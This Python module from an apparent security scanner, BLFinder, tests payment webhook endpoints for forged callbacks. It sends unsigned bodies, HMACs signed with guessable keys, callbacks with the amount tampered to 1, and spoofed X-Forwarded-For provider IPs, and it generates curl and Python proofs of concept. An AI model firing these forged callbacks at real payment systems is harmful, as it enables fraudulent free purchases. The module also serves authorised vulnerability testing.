"""
BLFinder — core/modules/webhook_bypass.py
Webhook / Payment-Callback Trust Bypass Scanner

The SSRFScanner already handles outbound SSRF via URL fields; this module
covers the inbound side: endpoints that *receive* callbacks and decide what
to trust in them.

Technique overview (four independent probes, each requires its own
confirmation so a single-probe false-positive doesn't inflate the report):

  1. Signature-absent bypass
     Fire a valid-looking payment/webhook body at the callback endpoint with
     the HMAC signature header missing entirely or set to empty. If the
     endpoint accepts it and returns a success-class response, the platform
     is not enforcing signature validation at all.

  2. Signature-forged bypass (guessable/empty key)
     Compute HMAC-SHA256 / HMAC-SHA1 of the body with a blank key (""),
     a single-char key ("0"), and the literal strings "secret" and
     "webhook_secret". Stripe, PayPal, and other providers use a
     per-integration secret that must be configured — a backend that forgets
     to configure it often falls back to an empty string.

  3. Amount-tamper on accepted body
     If probe 1 or 2 found that unsigned/weakly-signed bodies are accepted,
     run a follow-on: clone the body with the amount/total field set to 0.01
     and re-fire it. A platform that processes this as "payment received" is
     directly exploitable for financial fraud.

  4. IP-allowlist bypass via X-Forwarded-For
     Payment providers often document that their callbacks come from a fixed
     set of IPs and suggest blocking everything else. If that check is in a
     WAF or reverse-proxy layer, an X-Forwarded-For header may be enough to
     spoof it. Fire the same weakly-signed body with common provider IP
     addresses spoofed in X-Forwarded-For.

Each probe uses a canary check (deliberately invalid JSON body) to confirm
the endpoint is genuinely discriminating between valid and invalid content
before reporting — this prevents "this URL returns 200 for everything"
from becoming a finding.
"""

from __future__ import annotations

import copy
import hashlib
import hmac
import json
import re
from urllib.parse import urlparse

from ..models import Finding, Severity, ProofOfConcept
from ..response_heuristics import looks_like_error


_WEBHOOK_PATH_RE = re.compile(
    r"/(webhook|callback|notify|payment[_-]?(notify|confirm|callback|ipn)|"
    r"ipn|hook|event[_-]?notify|payment[_-]?update|transaction[_-]?(notify|update)|"
    r"charge[_-]?(webhook|callback)|stripe|paypal|flutterwave|paystack|"
    r"braintree|square[_-]?webhook|adyen|checkout[_-]?callback)",
    re.IGNORECASE,
)

_SIGNATURE_HEADERS = [
    "stripe-signature", "x-hub-signature-256", "x-hub-signature",
    "paypal-transmission-sig", "x-paystack-signature",
    "x-flutterwave-signature", "x-shopify-hmac-sha256",
    "x-wc-webhook-signature", "x-braintree-signature",
    "x-square-hmacsha256-signature", "svix-signature",
    "webhook-signature", "x-webhook-signature", "x-signature",
    "x-hmac-sha256", "x-hmac", "signature",
]

_AMOUNT_KEYS = (
    "amount", "total", "price", "charge", "fee", "value",
    "payment_amount", "order_total", "grand_total",
)

_PROVIDER_IPS = [
    "54.187.174.169", "54.187.205.235", "54.187.146.103",
    "13.57.112.182", "52.9.40.6", "52.9.56.17",
    "185.11.124.0", "185.11.125.0",
    "52.60.129.238", "54.72.54.77",
]

_GUESSABLE_KEYS = [b"", b"0", b"secret", b"webhook_secret", b"test", b"changeme"]

_SAMPLE_BODY = {
    "event": "payment.success",
    "amount": 10000,
    "currency": "USD",
    "status": "paid",
    "reference": "txn_blfinder_test",
    "customer": {"email": "test@example.com"},
}


class WebhookBypassScanner:
    """
    Usage:
        scanner.webhook_bypass = WebhookBypassScanner(scanner)
        findings = await scanner.webhook_bypass.check_endpoint(url, method, base_body)
        scanner.findings.extend(findings)
    """

    def __init__(self, scanner):
        self._scanner = scanner
        self._config = scanner.config
        self._request = scanner._request
        self._reported: set[str] = set()

    async def check_endpoint(
        self, url: str, method: str, base_body
    ) -> list[Finding]:
        if method != "POST":
            return []
        path = urlparse(url).path
        if not _WEBHOOK_PATH_RE.search(path):
            return []
        norm = urlparse(url).netloc + path
        if norm in self._reported:
            return []

        canary_ok = await self._canary_discriminates(url)
        if not canary_ok:
            return []

        findings: list[Finding] = []

        body = self._pick_body(base_body)
        body_bytes = json.dumps(body, separators=(",", ":")).encode()

        sig_header = self._detect_sig_header(base_body)

        f = await self._probe_absent(url, body, body_bytes, sig_header)
        if f:
            findings.append(f)
            f2 = await self._probe_amount_tamper(url, body, body_bytes, sig_header, "absent")
            if f2:
                findings.append(f2)
        else:
            f = await self._probe_forged(url, body, body_bytes, sig_header)
            if f:
                findings.append(f)
                f2 = await self._probe_amount_tamper(url, body, body_bytes, sig_header, "forged")
                if f2:
                    findings.append(f2)

        f = await self._probe_ip_spoof(url, body, body_bytes, sig_header)
        if f:
            findings.append(f)

        if findings:
            self._reported.add(norm)
        return findings

    async def _probe_absent(
        self, url: str, body: dict, body_bytes: bytes, sig_header: str | None,
    ) -> Finding | None:
        headers = {"Content-Type": "application/json"}
        status, _, resp_body, _ = await self._fire(url, body, extra_headers=headers)
        if not self._accepts(resp_body, status):
            return None

        return self._build(
            url=url, body=body,
            title=f"Webhook Signature Not Enforced — `{urlparse(url).path}`",
            severity=Severity.CRITICAL,
            confidence=85,
            confirmed=True,
            description=(
                f"The webhook endpoint at `{url}` accepted a POST body "
                f"with no signature header present{' (expected: ' + sig_header + ')' if sig_header else ''} "
                "and returned a success response. The server is not validating "
                "the HMAC signature that the payment provider signs every "
                "genuine callback with — an attacker can send a forged callback "
                "with any amount or status and have it processed as legitimate."
            ),
            recommendation=(
                "Verify the HMAC signature on every inbound webhook before "
                "acting on its content. Use `hmac.compare_digest()` for "
                "constant-time comparison to prevent timing attacks. Reject "
                "any request missing the expected signature header."
            ),
            cwe="CWE-347",
            cvss=9.1,
            owasp="API8:2023 Security Misconfiguration",
            category="Webhook — Signature Absent Accepted",
            tamper_note="no signature header",
        )

    async def _probe_forged(
        self, url: str, body: dict, body_bytes: bytes, sig_header: str | None,
    ) -> Finding | None:
        for key in _GUESSABLE_KEYS:
            sig = hmac.new(key, body_bytes, hashlib.sha256).hexdigest()
            header_name = sig_header or "x-hub-signature-256"
            headers = {
                "Content-Type": "application/json",
                header_name: f"sha256={sig}",
            }
            status, _, resp_body, _ = await self._fire(url, body, extra_headers=headers)
            if not self._accepts(resp_body, status):
                continue

            key_label = repr(key.decode(errors="replace"))
            return self._build(
                url=url, body=body,
                title=f"Webhook HMAC Signed with Guessable Key — `{urlparse(url).path}`",
                severity=Severity.CRITICAL,
                confidence=88,
                confirmed=True,
                description=(
                    f"The webhook endpoint at `{url}` accepted a POST body "
                    f"whose `{header_name}` signature was computed with the "
                    f"trivially-guessable key `{key_label}`. The integration "
                    "secret has not been configured (or was left at its default "
                    "empty/trivial value), so any attacker who knows the "
                    "signature algorithm can forge callbacks with arbitrary "
                    "content."
                ),
                recommendation=(
                    "Set a strong, randomly-generated webhook secret in your "
                    "payment provider's integration settings and store it as an "
                    "environment variable — never hard-code it. Rotate it "
                    "immediately if it has been exposed."
                ),
                cwe="CWE-321",
                cvss=9.1,
                owasp="API8:2023 Security Misconfiguration",
                category="Webhook — Forged Signature Accepted (Guessable Key)",
                tamper_note=f"HMAC-SHA256 with key={key_label}",
            )
        return None

    async def _probe_amount_tamper(
        self, url: str, body: dict, body_bytes: bytes,
        sig_header: str | None, bypass_type: str,
    ) -> Finding | None:
        tampered = copy.deepcopy(body)
        if not self._set_amount(tampered, 1):
            return None

        tampered_bytes = json.dumps(tampered, separators=(",", ":")).encode()
        headers = {"Content-Type": "application/json"}
        if bypass_type == "forged":
            sig = hmac.new(b"", tampered_bytes, hashlib.sha256).hexdigest()
            headers[sig_header or "x-hub-signature-256"] = f"sha256={sig}"

        status, _, resp_body, _ = await self._fire(url, tampered, extra_headers=headers)
        if not self._accepts(resp_body, status):
            return None

        return self._build(
            url=url, body=tampered,
            title=f"Forged Payment Callback Accepted at Tampered Amount — `{urlparse(url).path}`",
            severity=Severity.CRITICAL,
            confidence=92,
            confirmed=True,
            description=(
                f"Building on the signature bypass found above, a forged "
                f"callback at `{url}` with the amount field set to `1` (minor "
                "unit) was accepted and produced a success response. This "
                "directly confirms an attacker can trigger the platform's "
                "payment-received logic for an arbitrarily small amount — "
                "effectively obtaining a free purchase."
            ),
            recommendation=(
                "Fix the signature validation first (see the finding above). "
                "Additionally, once signature validation is in place, verify "
                "the callback's amount against the expected amount for the "
                "referenced order/transaction on your own records — never "
                "trust the amount field in the callback body alone."
            ),
            cwe="CWE-345",
            cvss=9.8,
            owasp="API6:2023 Unrestricted Access to Sensitive Business Flows",
            category="Webhook — Forged Payment Amount Accepted",
            tamper_note="amount=1 (effectively free purchase)",
        )

    async def _probe_ip_spoof(
        self, url: str, body: dict, body_bytes: bytes, sig_header: str | None,
    ) -> Finding | None:
        for ip in _PROVIDER_IPS:
            headers = {
                "Content-Type": "application/json",
                "X-Forwarded-For": ip,
                "X-Real-IP": ip,
            }
            status, _hdr, resp_body, _t = await self._fire(url, body, extra_headers=headers)
            if not self._accepts(resp_body, status):
                continue

            canary_ip = "192.0.2.1"
            canary_headers = {**headers, "X-Forwarded-For": canary_ip, "X-Real-IP": canary_ip}
            canary_status, _hdr2, canary_body, _t2 = await self._fire(url, body, extra_headers=canary_headers)
            if self._accepts(canary_body, canary_status):
                break

            return self._build(
                url=url, body=body,
                title=f"Webhook IP-Allowlist Bypassed via X-Forwarded-For — `{urlparse(url).path}`",
                severity=Severity.HIGH,
                confidence=72,
                confirmed=False,
                description=(
                    f"The webhook endpoint at `{url}` was reachable with "
                    f"X-Forwarded-For: {ip} (a known payment provider IP) but "
                    f"not with X-Forwarded-For: {canary_ip} (a documentation "
                    "address). This suggests IP-based allowlisting is applied "
                    "at a layer that trusts client-supplied forwarding headers, "
                    "which is bypassable by any attacker who can send HTTP "
                    "requests to the origin server. Combined with the signature "
                    "bypass above, this is directly exploitable; without it, "
                    "it still reduces defense-in-depth to zero."
                ),
                recommendation=(
                    "Do not use IP allowlisting as the primary authentication "
                    "mechanism for inbound webhooks — always validate the HMAC "
                    "signature. If you do use IP filtering, configure it at the "
                    "infrastructure level (firewall/security group) using the "
                    "real source IP, not the X-Forwarded-For header."
                ),
                cwe="CWE-290",
                cvss=7.5,
                owasp="API8:2023 Security Misconfiguration",
                category="Webhook — IP-Allowlist Bypassable via Header Spoofing",
                tamper_note=f"X-Forwarded-For: {ip}",
            )
        return None

    async def _canary_discriminates(self, url: str) -> bool:
        canary_body = {"__blfinder_canary__": True, "definitely_not_valid": "junk"}
        status, _, resp_body, _ = await self._fire(url, canary_body)
        if self._accepts(resp_body, status):
            return False
        return True

    async def _fire(
        self, url: str, body: dict, extra_headers: dict | None = None,
    ) -> tuple[int, dict, str, float]:
        try:
            return await self._request(
                "POST", url,
                json=body,
                headers=extra_headers or {"Content-Type": "application/json"},
            )
        except Exception as e:
            if self._config.verbose:
                print(f"[!] WebhookBypassScanner probe on {url}: {e}")
            return 0, {}, "", 0.0

    def _accepts(self, body: str, status: int) -> bool:
        return status in (200, 201) and not looks_like_error(body, status)

    def _pick_body(self, base_body) -> dict:
        if isinstance(base_body, dict) and base_body:
            return copy.deepcopy(base_body)
        return copy.deepcopy(_SAMPLE_BODY)

    def _detect_sig_header(self, base_body) -> str | None:
        if not isinstance(base_body, dict):
            return None
        body_keys = {k.lower() for k in base_body}
        for h in _SIGNATURE_HEADERS:
            if h.lower().replace("-", "_") in body_keys:
                return h
        return None

    def _set_amount(self, body: dict, value) -> bool:
        for k in list(body.keys()):
            if any(ak in k.lower() for ak in _AMOUNT_KEYS):
                body[k] = value
                return True
            if isinstance(body[k], dict):
                if self._set_amount(body[k], value):
                    return True
        return False

    def _build(
        self, url, body, title, severity, confidence, confirmed,
        description, recommendation, cwe, cvss, owasp, category, tamper_note,
    ) -> Finding:
        host = urlparse(url).netloc
        path = urlparse(url).path or "/"
        body_str = json.dumps(body, indent=2)
        curl = (
            f'curl -sk -X POST "{url}" \\\n'
            f'  -H "Content-Type: application/json" \\\n'
            f"  -d '{body_str}'"
        )
        python_script = (
            "import requests, json\n\n"
            f'url = "{url}"\n'
            f"body = {body_str}\n"
            f'r = requests.post(url, json=body, verify=False)\n'
            "print(r.status_code, r.text[:400])\n"
        )
        burp = (
            f"POST {path} HTTP/1.1\n"
            f"Host: {host}\n"
            "Content-Type: application/json\n"
            "Connection: close\n\n"
            f"{body_str}"
        )
        poc = ProofOfConcept(
            summary=title,
            curl_command=curl,
            python_script=python_script,
            burp_request=burp,
            expected_result=(
                f"Server returns HTTP 200/201 and processes the forged callback "
                f"({tamper_note}) as legitimate."
            ),
            steps=[
                f"Send the POST request above to `{url}` without any signature header.",
                "Observe the success response — the server accepted an unsigned/forged callback.",
                "If amount-tamper probe also succeeded: check the resulting order/transaction "
                "record to confirm the amount was recorded as 1 (minor unit).",
            ],
        )
        f = Finding(
            title=title,
            severity=severity,
            category=category,
            description=description,
            request={"method": "POST", "url": url, "body": body},
            response_summary=f"HTTP 200/201 on forged/unsigned webhook body ({tamper_note})",
            evidence=f"POST {url} with {tamper_note} → accepted",
            recommendation=recommendation,
            cwe=cwe, cvss=cvss, owasp=owasp,
            confirmed=confirmed, confidence=confidence,
            confidence_reasons=[title],
            endpoint=url, parameter="webhook_body",
        )
        f.poc = poc
        return f
